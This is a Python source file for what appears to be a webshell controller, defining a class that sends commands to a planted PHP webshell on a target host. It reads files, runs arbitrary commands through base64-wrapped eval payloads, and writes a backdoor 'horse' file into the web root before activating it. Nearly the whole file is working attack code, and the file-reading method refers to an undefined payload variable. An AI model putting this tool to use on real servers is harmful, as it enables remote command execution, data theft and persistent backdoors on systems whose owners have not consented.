import base64
import random
import requests
import libs.Models
from config.config import Config
from libs.OutputColor import Color


class AttackRequest:
    def __init__(self):
        self.login = False
        self.Targets = libs.Models.Targets()
        self.session = requests.session()
        self.user_agent_list = [
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95',
            'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
            'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 '
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
        ]
        self.headers = {
            "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding" : "gzip, deflate",
            "Accept-Language" : "en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6",
            "Sec-Fetch-Site" : "same-origin",
            "Sec-Fetch-Mode" : "navigate",
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'User-Agent': random.choice(self.user_agent_list)
        }


    @staticmethod
    def handle_response(response):
        response_result = None
        if response.status_code == 200:
            response_result = response.content.decode('utf-8', 'replace').replace('\n', ' ')
        elif response.status_code == 404:
            print(Color('404 Not Found.', 'red').print())
        else:
            responseMessage = 'Code {}, Request error'.format(response.status_code)
            print(Color(responseMessage, 'red').print())
        return response_result


    def handle_login(self, target):
        """登录模块"""
        if self.login:
            login_file = ''
            ip, port = target['ip'], target['port']
            data = {"username" : '', "password" : ''}
            url = 'http://{}:{}/{}'.format(ip, port, login_file)
            try:
                self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
            except requests.Timeout:
                pass
        else:
            pass


    def handle_read_file(self, target, webshell, file_path):
        global url
        global result
        global response

        webshell_path = webshell['WebShell_path']
        webshell_type = webshell['WebShell_type']
        webshell_passwd = webshell['WebShell_passwd']
        webshell_request = webshell['WebShell_Request']
        ip, port = target['ip'], target['port']

        self.handle_login(target)

        if webshell_request == 'GET':
            url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, file_path)
            url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, file_path)
            print(Color('Please input url1 or url2:', 'yellow').print())
            while True:
                inputUrl = input('[+] url_select> ').strip()
                if inputUrl == 'url1':
                    url = url1
                    break
                elif inputUrl == 'url2':
                    url = url2
                    break
                else:
                    print(Color('Input error, Please try again!', 'red').print())
                    continue
            try:
                response = self.session.get(url=url, headers=self.headers, proxies=Config.proxy, timeout=4)
            except requests.Timeout:
                print(Color('Connect failed, Timeout!', 'red').print())

        elif webshell_request == 'POST' or 'REQUEST':
            url = 'http://{}:{}/{}'.format(ip, port, webshell_path)
            data = {webshell_passwd: payload}
            try:
                response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
            except requests.Timeout:
                print(Color('Connect failed, Timeout!', 'red').print())

        if response:
            result = self.handle_response(response)

        return result


    def handle_execute_command(self, target, webshell, payload):
        global url
        global result
        global response

        webshell_path = webshell['WebShell_path']
        webshell_type = webshell['WebShell_type']
        webshell_passwd = webshell['WebShell_passwd']
        webshell_request = webshell['WebShell_Request']
        ip, port = target['ip'], target['port']

        self.handle_login(target)

        if webshell_type == 'eval' or webshell_type == 'assert':
            payload = 'printf(\'*----START----*\');' + payload + ';printf(\'*----END----*\');'
            if Config.shellBase64Encode:
                payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())
        else:
            payload = 'echo \'*----START----*\'' + payload + ';echo \'*----END----*\';'

        if webshell_request == 'GET':
            url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
            url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
            print(Color('Please input url1 or url2:', 'yellow').print())
            while True:
                inputUrl = input('[+] url_select> ').strip()
                if inputUrl == 'url1':
                    url = url1
                    break
                elif inputUrl == 'url2':
                    url = url2
                    break
                else:
                    print(Color('Input error, Please try again!', 'red').print())
                    continue
            try:
                response = self.session.get(url=url, headers=self.headers, proxies=Config.proxy, timeout=4)
            except requests.Timeout:
                print(Color('Connect failed, Timeout!', 'red').print())
        elif webshell_request == 'POST' or webshell_request == 'REQUEST':
            url = 'http://{}:{}/{}'.format(ip, port, webshell_path)
            data = {webshell_passwd : payload}
            try:
                response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
            except requests.Timeout:
                print(Color('Connect failed, Timeout!', 'red').print())

        if response:
            result = self.handle_response(response)
            if result or result == '':
                try:
                    result = result.split('*----START----*')[1].split('*----END----*')[0]
                except Exception as e:
                    errorMessage = str(e) + 'Request successfully but eval error!'
                    print(Color(errorMessage, 'red').print())
        return result


    def handle_upload_horse(self, target, webshell, horse_name):
        global url
        global payload
        global response

        webshell_path = webshell['WebShell_path']
        webshell_type = webshell['WebShell_type']
        webshell_passwd = webshell['WebShell_passwd']
        webshell_request = webshell['WebShell_Request']
        ip, port = target['ip'], target['port']

        horse_content = open('horse/' + str(horse_name) + '.php', 'rb').read()
        horse_b64content = base64.b64encode(horse_content).decode()

        self.handle_login(target)

        if webshell_request == 'GET':
            payload = 'var_dump(file_put_contents(\'/var/www/html/h3rmesk1t.php\', base64_decode(file_get_contents(\'php://input\'))));'
        else:
            payload = 'var_dump(file_put_contents(\'var/www/html/h3rmesk1t.php\', base64_decode(\'{}\')))'.format(horse_b64content)

        if Config.shellBase64Encode:
            payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())


        if webshell_request == 'GET':
            url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
            url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
            print(Color('Please input url1 or url2:', 'yellow').print())
            while True:
                inputUrl = input('[+] url_select> ').strip()
                if inputUrl == 'url1':
                    url = url1
                    break
                elif inputUrl == 'url2':
                    url = url2
                    break
                else:
                    print(Color('Input error, Please try again!', 'red').print())
                    continue
            data = horse_b64content
        else:
            url = 'http://{}:{}/{}'.format(ip, port, webshell_path)
            data = {webshell_passwd : horse_b64content}

        try:
            response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
        except requests.Timeout:
            print(Color('Connect failed, Timeout!', 'red').print())
            return False

        if 'int({})'.format(len(horse_content)) in response.content.decode('utf-8', 'replace'):
            print(Color('Upload Successfully!', 'blue').print())
            self.active_horse(ip, port)
        else:
            print(Color('Upload Failed!', 'red').print())


    def active_horse(self, ip, port):
        print(Color('Please input target\'s_horse_path', 'yellow').print())
        tgs_horse_path = input('[+] target\'s_horse_path> ').strip()
        url = 'http://{}:{}/{}'.format(ip, port, tgs_horse_path)
        res = requests.get(url=url, headers=self.headers)
        if res.status_code == 200:
            print(Color('Active Successfully!', 'blue').print())
            return True
        else:
            print(Color('Active failed!', 'red').print())